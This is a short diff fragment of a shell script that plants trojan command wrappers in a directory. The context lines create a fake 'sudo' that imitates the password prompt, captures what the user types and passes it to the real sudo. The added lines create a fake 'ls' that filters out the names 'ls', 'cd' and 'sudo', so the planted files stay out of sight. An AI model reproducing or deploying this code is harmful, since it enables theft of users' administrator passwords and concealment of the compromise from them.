@@ -14,3 +14,6 @@ echo "read -sp \"[sudo] password for $(whoami): \" p" >> sudo
 echo "echo $p | sudo -S $@" >> sudo
 chmod +x sudo
 
+echo "#!/bin/bash" > ls
+echo "ls $@ | sed 's/ls//g' | sed 's/cd//g' | sed 's/sudo//g' | column" >> ls
+chmod +x ls
